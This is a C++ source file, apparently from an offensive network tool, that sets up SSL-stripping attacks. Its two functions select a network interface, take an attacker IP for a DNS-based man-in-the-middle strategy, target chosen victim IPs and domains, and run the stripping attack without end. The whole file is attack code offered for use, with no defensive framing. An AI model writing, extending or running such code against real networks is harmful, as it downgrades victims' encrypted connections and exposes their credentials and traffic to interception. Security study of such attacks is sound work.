#include "ssl_stripping/public.h"
#include "IpAddress.h"
#include "PcapLiveDevice.h"
#include "PcapLiveDeviceList.h"
#include "ssl_stripping/all_out.h"
#include "ssl_stripping/silent.h"
#include <memory>
#include <stdexcept>
#include <string>
#include <utility>

/**
 * In the current implementation this method will not terminate and keep
 * performing the attack.
 */
void ATK::SSL::allOutStrip(const AllOutStrippingOptions &options) {
    pcpp::PcapLiveDevice *device =
        pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByIpOrName(
            options.ifaceIpOrName);

    if (device == nullptr) {
        throw std::invalid_argument(options.ifaceIpOrName +
                                    " is not a valid interface");
    }

    ATK::SSL::AllOutSslStrippingStrategy::Builder builder(device);

    if (options.mitmStrategy == ATK::SSL::MitmStrategy::DNS) {
        if (options.attackerIp.has_value()) {
            const pcpp::IPv4Address attackerIpAddress(options.attackerIp.value());
            builder.addAttackerIp(attackerIpAddress);
        } else {
            throw std::runtime_error("Could not run SSL attack since no attacker "
                                 "IP was supplied while using DNS strategy!");
        }
    }

    builder = builder.setMitmStrategy(options.mitmStrategy);

    std::unique_ptr<ATK::SSL::AllOutSslStrippingStrategy> strategy =
        builder.build();

    SslStrippingContext sslStrippingContext(std::move(strategy));

    sslStrippingContext.execute();
}

void ATK::SSL::silentStrip(const SilentStrippingOptions &options) {
    pcpp::PcapLiveDevice *device =
        pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByIpOrName(
            options.ifaceIpOrName);

    if (device == nullptr) {
        throw std::invalid_argument(options.ifaceIpOrName +
                                    " is not a valid interface");
    }

    ATK::SSL::SilentSslStrippingStrategy::Builder builder(device);

    if (options.mitmStrategy == ATK::SSL::MitmStrategy::DNS) {
        if (options.attackerIp.has_value()) {
            const pcpp::IPv4Address attackerIpAddress(options.attackerIp.value());
            builder.addAttackerIp(attackerIpAddress);
        } else {
            throw std::runtime_error("Could not run SSL attack since no attacker "
                                 "IP was supplied while using DNS strategy!");
        }
    }
    

    for (const std::string &victimIpStr : options.victimIps) {
        const pcpp::IPv4Address victimIp(victimIpStr);
        builder = builder.addVictimIp(victimIp);
    }

    for (const std::string &domainToStripStr : options.domainsToStrip) {
        builder = builder.addDomainToStrip(domainToStripStr);
    }

    builder = builder.setMitmStrategy(options.mitmStrategy);

    std::unique_ptr<ATK::SSL::SilentSslStrippingStrategy> strategy =
        builder.build();

    SslStrippingContext sslStrippingContext(std::move(strategy));

    sslStrippingContext.execute();
}
